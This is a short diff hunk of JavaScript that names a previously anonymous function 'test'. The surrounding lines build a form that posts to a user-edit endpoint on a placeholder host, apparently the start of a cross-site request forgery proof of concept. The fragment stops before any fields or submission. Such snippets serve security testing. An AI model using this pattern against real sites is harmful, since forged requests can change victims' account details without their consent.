@@ -1,4 +1,4 @@
-(function() {
+(function test() {
     var f = document.createElement('form');
     f.method = 'POST';
     f.action = 'https://test.com/CRS.UI.Web/User/Edit';
